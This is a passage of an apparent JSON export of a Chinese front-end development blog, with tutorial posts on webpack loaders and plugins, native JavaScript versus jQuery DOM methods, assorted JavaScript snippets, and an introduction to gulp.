&#123;&quot;start&quot;: &quot;webpack-dev-server --hot --inline&quot;&#125;, 在项目根目录下输入npm start,一堆花花绿绿的信息后server已经起来了，在浏览器里面输入http://localhost:8080发现hello world出现了，在js里面随便修改一些输出,然后保存,浏览器自动刷新，新的结果出现了 拓展阅读 如果你的服务器端使用的是express框架，你还可以直接安装express的middleware，webpack配合express，很好用 1npm install webpack-dev-middleware --save-dev 4.2 添加CSS样式 现在来添加一些样式，webpack使用loader的方式来处理各种各样的资源，比如说样式文件，我们需要两种loader，css-loader和 style－loader，css-loader会遍历css文件，找到所有的url(...)并且处理。style-loader会把所有的样式插入到你页面的一个style tag中 安装我们的loader 1npm install css-loader style-loader --save-dev 配置loader，在webpack.config.js中 1234567891011121314151617181920devServer: &#123;historyApiFallback: true,hot: true,inline: true,progress: true,&#125;,...module: &#123;loaders: [&#123;test: /\\.css$/,loaders: [&apos;style&apos;, &apos;css&apos;],include: APP_PATH&#125;]&#125;,...plugins: [new HtmlwebpackPlugin(&#123;title: &apos;Hello World app&apos; 看loaders的书写方式，test里面包含一个正则，包含需要匹配的文件，loaders是一个数组，包含要处理这些程序的loaders，这里我们用了css和style，注意loaders的处理顺序是从右到左的，这里就是先运行css-loader然后是style-loader 新建一个样式文件 main.css 123h1 &#123;color: red;&#125; 记得在入口文件index.js中引用 1require(&apos;./main.css&apos;); 然后发现标题变成红色的了，webpack的理念是基于项目处理的，把对应的文件格式给对应的loader处理，然后你就不用管了，它会决定怎么压缩，编译 那现在想使用一些有爱的css预编译程序，来点sass吧。 你可能已经想到了，再来个loader就行啦，确实是这样简单 1npm install sass-loader --save-dev 稍微修改一下config，删掉我们先前添加的css规则，加上下面的loader 12345&#123;test: /\\.scss$/,loaders: [&apos;style&apos;, &apos;css&apos;, &apos;sass&apos;],include: APP_PATH&#125;, 添加两个sass文件，variables.scss和main.scss variables.scss 1$red: red; main.scss 1234@import &quot;./variables.scss&quot;;h1 &#123;color: $red;&#125; 在index.js中引用1require(&apos;./main.scss&apos;); 然后发现标题如愿变红 4.3 处理图片和其他静态文件 这个和其他一样，也许你也已经会玩了。安装loader，处理文件。诸如图片，字体等等，不过有个神奇的地方它可以根据你的需求将一些图片自动转成base64编码的，为你减轻很多的网络请求 安装url-loader 1npm install url-loader --save-dev 配置config文件 1234&#123;test: /\\.(png|jpg)$/,loader: &apos;url?limit=40000&apos;&#125; 注意后面那个limit的参数，当你图片大小小于这个限制的时候，会自动启用base64编码图片 新建一个imgs文件夹，往里面添加一张照片。在scss文件中添加如下的东西 12345@import &quot;./variables.scss&quot;;h1 &#123;color: $red;background: url(&apos;./imgs/avatar.jpg&apos;);&#125; npm start, 然后查看图片的url 4.4 添加第三方库 有的时候还想来点jquery，moment，undersocre之类的库webpack可以非常容易的做到这一点 那么我们现在安装在我们的app中添加jquery和moment的支持 1npm install jquery moment --save-dev 在js中引用 12345678var sub = require(&apos;./sub&apos;);var $ = require(&apos;jquery&apos;);var moment = require(&apos;moment&apos;);var app = document.createElement(&apos;div&apos;);app.innerHTML = &apos;&lt;h1&gt;Hello World it&lt;/h1&gt;&apos;;document.body.appendChild(app);app.appendChild(sub());$(&apos;body&apos;).append(&apos;&lt;p&gt;look at me! now is &apos; + moment().format() + &apos;&lt;/p&gt;&apos;); 看看浏览器，成功！ jquery和moment现在都起作用了 4.5 添加ES6的支持 首先 装各种loader 1npm install babel-loader babel-preset-es2015 --save-dev 配置我们的config文件 12345678&#123;test: /\\.jsx?$/,loader: &apos;babel&apos;,include: APP_PATH,query: &#123;presets: [&apos;es2015&apos;]&#125;&#125;, es2015这个参数是babel的plugin，可以支持各种最新的es6的特性，具体的情况看这个链接 现在我们可以改掉CommonJS风格的文件了 sub.js 12345export default function() &#123; var element = document.createElement(&apos;h2&apos;); element.innerHTML = &quot;Hello h2 world hahaha&quot;; return element;&#125; index.js 123456789101112import &apos;./main.scss&apos;;import generateText from &apos;./sub&apos;;import $ from &apos;jquery&apos;;import moment from &apos;moment&apos;;let app = document.createElement(&apos;div&apos;);const myPromise = Promise.resolve(42);myPromise.then((number) =&gt; &#123;$(&apos;body&apos;).append(&apos;&lt;p&gt;promise result is &apos; + number + &apos; now is &apos; + moment().format() + &apos;&lt;/p&gt;&apos;);&#125;);app.innerHTML = &apos;&lt;h1&gt;Hello World it&lt;/h1&gt;&apos;;document.body.appendChild(app);app.appendChild(generateText()); 我们上面测试了import,export，const，let，promise等一系列es6的特性 五、插件 插件可以完成更多 loader 不能完成的功能 插件的使用一般是在 webpack 的配置信息 plugins 选项中指定 Webpack 本身内置了一些常用的插件，还可以通过 npm 安装第三方插件 接下来，我们利用一个最简单的 BannerPlugin 内置插件来实践插件的配置和运行，这个插件的作用是给输出的文件头部添加注释信息 修改 webpack.config.js，添加 plugins 12345678910111213141516var webpack = require(&apos;webpack&apos;)module.exports = &#123;entry: &apos;./entry.js&apos;,output: &#123;path: __dirname,filename: &apos;bundle.js&apos;&#125;,module: &#123;loaders: [&#123;test: /\\.css$/, loader: &apos;style!css&apos;&#125;]&#125;,plugins: [new webpack.BannerPlugin(&apos;This file is created by zhaoda&apos;)]&#125; 然后运行 webpack ，打开 bundle.js ，可以看到文件头部出现了我们指定的注释信息 12345/*! This file is created by zhaoda *//******/ (function(modules) &#123; // webpackBootstrap/******/ // The module cache/******/ var installedModules = &#123;&#125;;// 后面代码省略 六、开发环境 当项目逐渐变大，webpack 的编译时间会变长，可以通过参数让编译的输出内容带有进度和颜色 1$ webpack --progress --colors 如果不想每次修改模块后都重新编译，那么可以启动监听模式。开启监听模式后，没有变化的模块会在编译后缓存到内存中，而不会每次都被重新编译，所以监听模式的整体速度是很快的 1$ webpack --progress --colors --watch 当然，使用 webpack-dev-server开发服务是一个更好的选择。它将在 localhost:8080 启动一个 express 静态资源 web服务器，并且会以监听模式自动运行 webpack，在浏览器打开http://localhost:8080/或 http://localhost:8080/webpack-dev-server/ 可以浏览项目中的页面和编译后的资源输出，并且通过一个 socket.io 服务实时监听它们的变化并自动刷新页面 1234# 安装$ npm install webpack-dev-server -g# 运行$ webpack-dev-server --progress --colors 七、故障处理 Webpack 的配置比较复杂，很容出现错误，下面是一些通常的故障处理手段 一般情况下，webpack如果出问题，会打印一些简单的错误信息，比如模块没有找到。我们还可以通过参数 --display-error-details来打印错误详情 1234567891011121314151617181920212223242526$ webpack --display-error-detailsHash: a40fbc6d852c51fceadbVersion: webpack 1.12.2Time: 586msAsset Size Chunks Chunk Namesbundle.js 12.1 kB 0 [emitted] main[0] ./entry.js 153 bytes &#123;0&#125; [built] [1 error][5] ./module.js 43 bytes &#123;0&#125; [built]+ 4 hidden modulesERROR in ./entry.jsModule not found: Error: Cannot resolve &apos;file&apos; or &apos;directory&apos; ./badpathmodule in /Users/zhaoda/data/projects/webpack-handbook/examplesresolve file/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule doesn&apos;t exist/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.webpack.js doesn&apos;t exist/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.js doesn&apos;t exist/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.web.js doesn&apos;t exist/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.json doesn&apos;t existresolve directory/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule doesn&apos;t exist (directory default file)/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule/package.json doesn&apos;t exist (directory description file)[/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule][/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.webpack.js][/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.js][/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.web.js][/Users/zhaoda/data/projects/webpack-handbook/examples/badpathmodule.json]@ ./entry.js 3:0-26 Webpack的配置提供了 resolve 和resolveLoader 参数来设置模块解析的处理细节， resolve用来配置应用层的模块（要被打包的模块）解析， resolveLoader用来配置loader模块的解析 当引入通过 npm 安装的 node.js 模块时，可能出现找不到依赖的错误。Node.js模块的依赖解析算法很简单，是通过查看模块的每一层父目录中的 node_modules 文件夹来查询依赖的。当出现 Node.js模块依赖查找失败的时候，可以尝试设置 resolve.fallback和resolveLoader.fallback 来解决问题 1234module.exports = &#123;resolve: &#123; fallback: path.join(__dirname, &quot;node_modules&quot;) &#125;,resolveLoader: &#123; fallback: path.join(__dirname, &quot;node_modules&quot;) &#125;&#125;; Webpack中涉及路径配置最好使用绝对路径，建议通过 path.resolve(__dirname,&quot;app/folder&quot;) 或 path.join(__dirname, &quot;app&quot;, &quot;folder&quot;)的方式来配置，以兼容 Windows环境 八、开发和部署技巧 8.1 启用source-map 现在的代码是合并以后的代码，不利于排错和定位，只需要在config中添加 1devtool: &apos;eval-source-map&apos;, 这样出错以后就会采用source-map的形式直接显示你出错代码的位置 8.2 使用preLoaders和postLoaders 也许你想在写代码的时候检查自己的js是否符合jshint的规范，那么隆重推荐preLoaders和postLoaders perLoaders顾名思义就是在loaders执行之前处理的，webpack的处理顺序是perLoaders - loaders - postLoaders 安装jshint 1npm install jshint-loader --save-dev 在config文件中配置 12345678910111213141516module: &#123;...//和loaders一样的语法，很简单perLoaders: [&#123;test: /\\.jsx?$/,include: APP_PATH,loader: &apos;jshint-loader&apos;&#125;]&#125;...//配置jshint的选项，支持es6的校验jshint: &#123;&quot;esnext&quot;: true&#125;, 好了 现在每次npm run start的时候就可以看到jshint的提示信息啦 8.3 部署上线 刚才说的各种情况都是在开发时候的情况，那么假如项目已经开发完了，需要部署上线了。我们应该新创建一个单独的config文件，因为部署上线使用webpack的时候我们不需要一些dev-tools,dev-server和jshint校验等 复制我们现有的config文件，命名webpack.production.config.js，将里面关于 devServer等和开发有关的东西删掉 在package.json中添加一个命令 1234&quot;scripts&quot;: &#123;&quot;start&quot;: &quot;webpack-dev-server --hot --inline&quot;,&quot;build&quot;: &quot;webpack --progress --profile --colors --config webpack.production.config.js&quot;&#125;, 当要上线的时候,运行 1npm run build 可以发现build文件夹中生成了所有东西","categories":[{"name":"Build","slug":"Build","permalink":"https://ru23.com/categories/Build/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://ru23.com/tags/webpack/"}]},{"title":"原生JS与jQuery操作DOM对比","slug":"2017-01-js-and-jquery-dom-compare","date":"2017-01-14T03:30:43.000Z","updated":"2018-10-24T03:46:02.057Z","comments":true,"path":"note/753b84db.html","link":"","permalink":"https://ru23.com/note/753b84db.html","excerpt":"一、创建元素节点 1.1 原生JS创建元素节点 1document.createElement(\"p\"); 1.2 jQuery创建元素节点","text":"一、创建元素节点 1.1 原生JS创建元素节点 1document.createElement(\"p\"); 1.2 jQuery创建元素节点 1$('&lt;p&gt;&lt;/p&gt;');` 二、创建并添加文本节点 2.1 原生JS创建文本节点 1`document.createTextNode(\"Text Content\"); 通常创建文本节点和创建元素节点配合使用，比如： 123var textEl = document.createTextNode(\"Hello World.\");var pEl = document.createElement(\"p\");pEl.appendChild(textEl); 2.2 jQuery创建并添加文本节点： 1var $p = $('&lt;p&gt;Hello World.&lt;/p&gt;'); 三、复制节点 3.1 原生JS复制节点: 1var newEl = pEl.cloneNode(true); ` true和false的区别： true ：克隆整个&#39;&lt;p&gt;Hello World.&lt;/p&gt;&#39;节点 false：只克隆&#39;&lt;p&gt;&lt;/p&gt;&#39; ，不克隆文本Hello World.&#39; 3.2 jQuery复制节点 1$newEl = $('#pEl').clone(true); 注意：克隆节点要避免`ID重复 四、 插入节点 4.1 原生JS向子节点列表的末尾添加新的子节点 1El.appendChild(newNode); 原生JS在节点的已有子节点之前插入一个新的子节点： 1El.insertBefore(newNode, targetNode); 4.2 在jQuery中，插入节点的方法比原生JS多的多 在匹配元素子节点列表结尾添加内容 1$('#El').append('&lt;p&gt;Hello World.&lt;/p&gt;'); 把匹配元素添加到目标元素子节点列表结尾 1$('&lt;p&gt;Hello World.&lt;/p&gt;').appendTo('#El'); 在匹配元素子节点列表开头添加内容 1$('#El').prepend('&lt;p&gt;Hello World.&lt;/p&gt;'); 把匹配元素添加到目标元素子节点列表开头 1$('&lt;p&gt;Hello World.&lt;/p&gt;').prependTo('#El'); 在匹配元素之前添加目标内容 1$('#El').before('&lt;p&gt;Hello World.&lt;/p&gt;'); 把匹配元素添加到目标元素之前 1$('&lt;p&gt;Hello World.&lt;/p&gt;').insertBefore('#El'); 在匹配元素之后添加目标内容 1$('#El').after('&lt;p&gt;Hello World.&lt;/p&gt;'); 把匹配元素添加到目标元素之后 1$('&lt;p&gt;Hello World.&lt;/p&gt;').insertAfter('#El'); 五、删除节点 5.1 原生JS删除节点 1El.parentNode.removeChild(El); 5.2 jQuery删除节点 1$('#El').remove(); 六、替换节点 6.1 原生JS替换节点 1El.repalceChild(newNode, oldNode); 注意：oldNode必须是parentEl真实存在的一个子节点 6.2 jQuery替换节点 1$('p').replaceWith('&lt;p&gt;Hello World.&lt;/p&gt;'); 七、设置属性/获取属性 7.1 原生JS设置属性/获取属性 1234imgEl.setAttribute(\"title\", \"logo\");imgEl.getAttribute(\"title\");checkboxEl.checked = true;checkboxEl.checked; 7.2 jQuery设置属性/获取属性: 1234$(\"#logo\").attr(&#123;\"title\": \"logo\"&#125;);$(\"#logo\").attr(\"title\");$(\"#checkbox\").prop(&#123;\"checked\": true&#125;);$(\"#checkbox\").prop(\"checked\");","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"DOM","slug":"DOM","permalink":"https://ru23.com/tags/DOM/"}]},{"title":"jQuery之DOM操作小结","slug":"2017-01-jQuery-dom","date":"2017-01-14T02:20:43.000Z","updated":"2018-10-24T03:46:02.054Z","comments":true,"path":"note/def62515.html","link":"","permalink":"https://ru23.com/note/def62515.html","excerpt":"一、过滤器 1 匹配指定元素的父 elem.parent([exp]) 2 匹配指定元素的子元素","text":"一、过滤器 1 匹配指定元素的父 elem.parent([exp]) 2 匹配指定元素的子元素 elem.children([exp]) 3 匹配指定元素的父、祖元素… elem.parents([exp]) 4 匹配指定元素的子、孙元素… elem.find([exp]) 5 匹配指定元素的后一个兄弟元素 elem.next([exp]) 6 匹配指定元素的后面所有兄弟元素 elem.nextAll([exp]) 7 匹配指定元素的前一个兄弟元素 elem.prev([exp]) 8 匹配指定元素的前面所有兄弟元素 elem.prevAll([exp]) 9 匹配指定元素的所有兄弟元素 elem.siblings([exp]) 10 匹配指定以外的元素 elem.not(exp) 11 包括自身在内的全部元素 elem.andSelf() 12 返回指定索引值的元素 elem.eq(index) 13 判断元素是否包含指定的类 elem.hasClass(className) 二、文档处理 1 在指定元素内的未尾追加一个子元素 语法 :Elem.append(ele) 2 把元素的追加到指定父级元素内的末尾 语法 : ele.appendTo(Elem) 说明 : 要求ele必须为JQuery元素，可以通过Elem.children(‘:last’)引用 3 在指定元素内的开始添加一个子元素 语法 : Elem.prepend(ele) 4 把元素的加入指定父级元素内的开始 语法 : ele.prependTo(Elem) 说明 : 要求ele必须为JQuery元素，可以通过Elem.children().eq(0)引用 5 使元素逐一被指定的HTML标记包裹起来 语法 : Elem.wrap(Tag) 说明: Tag将成为元素的父元素，可以通过Elem.parent()引用 6 使元素集合被指定的HTML标记包裹起来 语法 :Elem.wrapAll(Tag) 说明:wrap把每个子元素逐一都包裹起来，wrapAll是把所有的子元素作为整体包裹起来。 7 包裹指定元素的子元素，相当于在元素和子元素中间加了隔离层 语法 : elem.wrapInner(Tag) 8 在元素之后添加兄弟元素。新添加的元素可以通过elem.next() 引用。 语法 : elem.after(ele) 9 在元素之前添加兄弟元素。新添加的元素可以通过elem.prev() 引用。 语法 : elem.before(ele) 10 将元素A移动到元素B之后 语法 : elA.insertAfter(elB) 11 将元素A移动到元素B之前 语法 : elA.insertBefore(elB) 12 清空元素的子节点(元素本身及其属性仍然存在) 语法 : elem.empty() 13 从DOM中删除所有匹配的元素 语法 : elems.remove([条件]) 14 将元素A替换为B 语法 : elA.replaceWith(elB);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"},{"name":"DOM","slug":"DOM","permalink":"https://ru23.com/tags/DOM/"}]},{"title":"javascript常用积累","slug":"2017-01-js-snippets-summary","date":"2017-01-14T00:20:43.000Z","updated":"2018-10-24T03:46:02.063Z","comments":true,"path":"note/160b6587.html","link":"","permalink":"https://ru23.com/note/160b6587.html","excerpt":"一、JS动画与动作不一致解决: 123if(!$( \"#handle\").is(\":animated\"))&#123; //判断元素是否处于动画状态&#125;","text":"一、JS动画与动作不一致解决: 123if(!$( \"#handle\").is(\":animated\"))&#123; //判断元素是否处于动画状态&#125; 二、停止事件冒泡 1234567891011event.stopPropagation();- 禁止JS报错 window.onerror = function()&#123; return true ; &#125;try &#123;/*try to do*/&#125; catch(e)&#123;/*do this if try error */&#125; 三、查看JS对象属性 1234567 var res = '' ; var obj = eval( obj ); for( var p in eval( obj ) )&#123; var prop = p + ':' + obj[p] + '\\n' ; res += prop ; &#125; alert( res ); 四、页面刷新时禁用提交按钮 123window.onbeforeunload = function()&#123; $(':submit').attr('disabled',true);&#125; 注意：Opera 浏览器不支持，其他浏览器避免在同一页面中使用 &quot;javascrpt:&quot; 等伪协议 五、获取事件 123456789var getEvent = function()&#123; var ieEvent = window.event ; var ffEvent = arguments.callee.caller.arguments[0] ; //arguments.callee 当前执行函数 //arguments.callee.caller 当前执行函数的调用者 //arguments.callee.caller.arguments[0] 当前函数调用者的第一个参数 var e = ieEvent || ffEvent ; return e ;&#125; 获取鼠标距离浏览器顶部 左侧的实际距离 兼容IE 12345678910111213141516171819202122function getXY(ev)&#123; var ev = ev || window.event; var xx = 0; var yy = 0; if(ev.pageX)&#123; //iE9+ xx = ev.pageX; yy = ev.pageY; &#125;else&#123; //IE678 clientX,clientY + scroll var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;//IE9+ var scrollLeft = document.documentElement.scrollLeft || document.body.scrollLeft;//IE9+ xx = ev.clientX + scrollLeft; yy = ev.clientY + scrollTop; &#125; return &#123; x:xx, y:yy &#125;; &#125; 六、获取键盘码 1234567var getKCode = function()&#123; var ieEvent = window.event ; var ffEvent = arguments.callee.caller.arguments[0] ; var e = ieEvent || ffEvent ; var kCode = e.keyCode || e.which ; return kCode ; &#125; 七、 鼠标滑入/滑出样式切换 123$(\"div\").on(\"mouseover mouseout\", function()&#123; $(this).toggleClass(\"over\"); &#125;); 八、点击鼠标,显示/隐藏切换 1234567$(\"#panel h5.head\").toggle(function()&#123; $(this).toggleClass(\"highlight\"); $(this).next().toggle();&#125;,function()&#123; $(this).toggleClass(\"highlight\"); $(this).next().toggle();&#125;); 九、JS 调试 12345console.log() ; //打印变量console.dir() ; //打印对象console.dirxml() ; //打印节点console.trace() ; //打印函数调用轨迹window.document.title = str; 十、为子元素集合绑定事件 123$(\"div\").delegate(\"button\",\"click\",function()&#123; $(\"p\").slideToggle();&#125;); 十一、自定义IE浏览器渲染方式(解决IE10下JS或插件失效): 如果安装了Chrome内核，则使用Chrome内核来渲染页面[chrome=1]，如果未安装，则使用最高版本的IE内核进行渲染[IE=edge]: 1&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" /&gt; 十二、注册事件 12345// 标准浏览器form1.addEventListener('submit', function(e)&#123; e.preventDefault(); //阻止浏览器默认动作 e.stopPropagation(); //阻止事件流产生&#125;); 12345// IE8及更早版本IE浏览器form1.attachEvent('submit', function()&#123; event.cancelBubble = true; //阻止浏览器默认动作--IE8及更早版本IE浏览器 event.returnValue = false; //阻止事件流产生--IE8及更早版本IE浏览器&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"Snippet","slug":"Snippet","permalink":"https://ru23.com/tags/Snippet/"}]},{"title":"webpack学习总结(一)","slug":"2017-01-webpack","date":"2017-01-13T10:40:43.000Z","updated":"2018-10-24T03:46:02.067Z","comments":true,"path":"note/6925e1c1.html","link":"","permalink":"https://ru23.com/note/6925e1c1.html","excerpt":"声明 本教程整理于互联网 先看一个例子 123456789101112131415161718// webpack.config.jsmodule.exports = &#123; // 入口 entry: &#123; 'index': './index.js' &#125;, // 输出 output: &#123; path: './', /* [name] 是 entry 中的 key entry: &#123; key: value &#125; */ filename: \"[name].b.js\" &#125;&#125;; module.exports 是 CommonJS 规范中定义一个文件对外接口的语法，webpack.config.js 文件对外的接口是一个 object ，其中定义了一些配置参数。","text":"声明 本教程整理于互联网 先看一个例子 123456789101112131415161718// webpack.config.jsmodule.exports = &#123; // 入口 entry: &#123; 'index': './index.js' &#125;, // 输出 output: &#123; path: './', /* [name] 是 entry 中的 key entry: &#123; key: value &#125; */ filename: \"[name].b.js\" &#125;&#125;; module.exports 是 CommonJS 规范中定义一个文件对外接口的语法，webpack.config.js 文件对外的接口是一个 object ，其中定义了一些配置参数。 一、参数详解 1.1 entry 最初 webpack 是为了构建 SPA (Single Page Application) ，entry 是『入口』配置。在 entry 中的文件才会被编译。 1.2 output output 控制构建后的文件的存放位置和命名。 path 定义所有构建后文件的所在目录，本例中构建到当前文件夹。 1.3 filename filename 控制构建后文件的文件名 1.4 源码和构建结果 1234// index.jsvar content = require(\"./content.js\")document.body.innerHTML = document.body.innerHTML + content 12// content.jsmodule.exports = \"some string\" 1234&lt;body&gt;&lt;a target=\"_blank\" href=\"https://github.com/nimojs/webpack-book/blob/gh-pages/1-modules/README.md\"&gt;本例说明&lt;/a&gt;&lt;script src=\"index.b.js\"&gt;&lt;/script&gt;&lt;/body&gt; 建议尽量理解构建后的代码，这样有助于理解 webpack 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/******/ (function(modules) &#123; // webpackBootstrap/******/ // The module cache/******/ var installedModules = &#123;&#125;;/******/ // The require function/******/ function __webpack_require__(moduleId) &#123;/******/ // Check if module is in cache/******/ if(installedModules[moduleId])/******/ return installedModules[moduleId].exports;/******/ // Create a new module (and put it into the cache)/******/ var module = installedModules[moduleId] = &#123;/******/ exports: &#123;&#125;,/******/ id: moduleId,/******/ loaded: false/******/ &#125;;/******/ // Execute the module function/******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);/******/ // Flag the module as loaded/******/ module.loaded = true;/******/ // Return the exports of the module/******/ return module.exports;/******/ &#125;/******/ // expose the modules object (__webpack_modules__)/******/ __webpack_require__.m = modules;/******/ // expose the module cache/******/ __webpack_require__.c = installedModules;/******/ // __webpack_public_path__/******/ __webpack_require__.p = \"\";/******/ // Load entry module and return exports/******/ return __webpack_require__(0);/******/ &#125;)/************************************************************************//******/ ([/* 0 *//***/ function(module, exports, __webpack_require__) &#123; var content = __webpack_require__(1) document.body.innerHTML = document.body.innerHTML + content/***/ &#125;,/* 1 *//***/ function(module, exports) &#123; module.exports = \"some string\"/***/ &#125;/******/ ]); 前面带 /******/的代码都是 webpack的模块化代码，它内置了一个模块加载器 模块 0 是 index.js 的代码，模块 1 是 require(&quot;./content.js&quot;) 的代码。如果你再 require 一个模块那么就会有模块 3。 二、JS包含样式 安装时间可能会比较久 123456# 安装所需 style-loader 和 css-loadernpm install css-loader style-loader -D# less 和 less-loader 可以选择不安装 （如果安装了请去掉 index.js 中引入 less 的注释）npm install less-loader -Dnpm install less -g 1webpack --watch 123456789101112131415161718192021module.exports = &#123; entry: &#123; 'index': './index.js' &#125;, output: &#123; path: './', filename: \"[name].b.js\" &#125;, module: &#123; loaders: [ &#123; test: /\\.css$/, loader: \"style!css\" &#125;, &#123; test: /\\.less$/, loader: \"style!css!less\" &#125; ] &#125;&#125;; module.loaders 定义 require 的模块代码会被如何编译。 官方文档 using-loaders 2.1 module.loaders[].test test 参数是一个正则表达式，用于匹配模块。&#39;./index.css&#39;.test(/\\.css&amp;/) 2.2 module.loaders[].loader loader 参数定义被 test 匹配到的模块会执行哪些构建操作 本例中 .css 后缀的文件会被 style-loader 和 css-loader 构建 2.3 require 时配置 loader 如果你不想在 webpack.config.js 配置，你还可以在 require 时单独定义一个文件会使用哪些 loader 1require('!style!css!./index.css') 2.4 被嵌入 &lt;head&gt; 查看 在线预览构建结果页面 源码可以看到样式通过 JS 嵌入到 &lt;head&gt; 中使用的12345&lt;head&gt;&lt;style type=\"text/css\"&gt;body &#123; background-color:#ABCDEF;&#125;&lt;/style&gt;&lt;/head&gt; 三、JS包含图片 1npm install url-loader file-loader -D 1webpack --watch 代码解释待补充 四、使用全局变量 1webpack -w 五、暴露全局变量 有些模块依赖全局变量 windows.jQuery 才能使用，可以通过 expose-loader 暴露全局变量 12npm install jquery --savenpm install expose-loader -D 1webpack -w 六、提取单独样式文件 有时候我们需要编译单独的 CSS 文件，这就需要 extract-text-webpack-plugin 插件 12npm install extract-text-webpack-plugin -Dnpm install style-loader css-loader -D 1webpack -w 七、自动打包公用资源 1npm install jquery paging --save 1webpack -w 八、文件指纹 hash 1webpack --watch 九、异步加载 1webpack --watch","categories":[{"name":"Build","slug":"Build","permalink":"https://ru23.com/categories/Build/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://ru23.com/tags/webpack/"}]},{"title":"gulp学习总结篇","slug":"2017-01-gulp","date":"2017-01-13T10:20:43.000Z","updated":"2018-10-24T03:46:02.053Z","comments":true,"path":"note/51b4c428.html","link":"","permalink":"https://ru23.com/note/51b4c428.html","excerpt":"声明 本教程整理于互联网 一、gulp 入门简介 gulp 是基于 node 实现Web 前端自动化开发的工具，利用它能够极大的提高开发效率。 在 Web 前端开发工作中有很多“重复工作”，比如压缩CSS/JS文件。而这些工作都是有规律的。找到这些规律，并编写 gulp 配置代码,让 gulp 自动执行这些“重复工作”。","text":"声明 本教程整理于互联网 一、gulp 入门简介 gulp 是基于 node 实现Web 前端自动化开发的工具，利用它能够极大的提高开发效率。 在 Web 前端开发工作中有很多“重复工作”，比如压缩CSS/JS文件。而这些工作都是有规律的。找到这些规律，并编写 gulp 配置代码,让 gulp 自动执行这些“重复工作”。 将规律转换为 gulp 代码 现有目录结构如下： 12└── js/ └── a.js 1.1 规律 找到 js/目录下的所有 .js 文件 压缩这些 js 文件 将压缩后的代码另存在 dist/js/ 目录下 1.2 编写 gulp 代码 123456789// 压缩 JavaScript 文件gulp.task('script', function() &#123; // 1. 找到 gulp.src('js/*.js') // 2. 压缩 .pipe(uglify()) // 3. 另存 .pipe(gulp.dest('dist/js'));&#125;); 1.3 代码执行结果 代码执行后文件结构 12345└── js/│ └── a.js└── dist/ └── js/ └── a.js a.js 压缩前12345function demo (msg) &#123; alert(&apos;--------\\r\\n&apos; + msg + &apos;\\r\\n--------&apos;)&#125;demo(&apos;Hi&apos;) a.js 压缩后1function demo(n)&#123;alert(&quot;--------\\r\\n&quot;+n+&quot;\\r\\n--------&quot;)&#125;demo(&quot;Hi&quot;); 此时 dist/js 目录下的 .js 文件都是压缩后的版本。 你还可以监控 js/ 目录下的 js 文件，当某个文件被修改时，自动压缩修改文件。启动 gulp 后就可以让它帮助你自动构建 Web 项目。 gulp 还可以做很多事，例如： 压缩CSS 压缩图片 编译Sass/LESS 编译CoffeeScript markdown转换为 html 二、安装 Node 和 gulp gulp 是基于 node 实现的，那么我们就需要先安装 node。 Node 是一个基于Chrome JavaScript V8引擎建立的一个平台，可以利用它实现 Web服务，做类似PHP的事。 打开 https://nodejs.org/ 点击绿色的 INSTALL 按钮下载安装 node。 2.1 命令行 在 Windows 中可按 &lt;kbd&gt;徽标键&lt;/kbd&gt;（alt键左边）+ R 打开输入 cmd + Enter 打开命令行。 2.2 终端(Mac) 打开 Launchpad（像火箭一样的图标），在屏幕上方搜索框中输入 终端 + Enter 打开终端。 2.3 查看 node 版本号 在终端/命令行中输入 node -v 检测node是否安装成功，安装成功会显示出node 的版本号。 2.4 跳转目录 终端/命令行 中可使用 cd 目录名 跳转至指定目录，Mac 中还可以使用 ls 查看当前目录下的文件列表。 2.5 Windows Windows 下可使用如下命令跳转至指定目录： 123456// 跳转至 C 盘根目录cd c:\\// 跳转至当前目录的 demo 文件夹cd demo// 跳转至上一级cd .. 2.6 Mac Mac中建议只在 Documents目录下进行文件操作。 123456789101112// 跳转至文档目录cd /Users/你的用户名/Documents/// 或第一次打开终端时直接输入cd Documents// 查看目录下文件列表ls// 创建文件夹mkdir demo// 跳转至当前目录下的 demo 文件夹cd demo// 跳转至上级目录cd .. 2.7 退出运行状态 如果你在命令行中启动了一些一直运行的命令，你的命令行会进入“运行”状态，此时你不可以在命令行进行其他操作。可通过 Ctrl + C 停止 gulp。（Mac 中使用 control + C） 后面的章节中如果代码中存在 gulp.watch 并在命令行运行了 gulp 则需要使用 Ctrl + C 退出任务。 2.8 npm 模块管理器 如果你了解 npm 则跳过此章节 若你不了解npm 请阅读 npm模块管理器 2.9 安装 gulp npm 是 node 的包管理工具，可以利用它安装 gulp 所需的包。（在安装 node 时已经自动安装了 npm） 在命令行输入 1npm install -g gulp 若一直没安装成功，请使用 cnpm 安装(npm的国内加速镜像) 意思是：使用 npm 安装全局性的(-g) gulp 包。 如果你安装失败，请输入sudo npm install -g gulp使用管理员权限安装。（可能会要求输入密码） 安装时请注意命令行的提示信息，安装完成后可在命令行输入 gulp -v 以确认安装成功。 至此，我们完成了准备工作。接着让 gulp开始帮我们干活吧！ 三、使用 gulp 压缩 JS 压缩js 代码可降低 js 文件大小，提高页面打开速度。在不利用 gulp 时我们需要通过各种工具手动完成压缩工作。 所有的 gulp 代码编写都可以看做是将规律转化为代码的过程。 规律 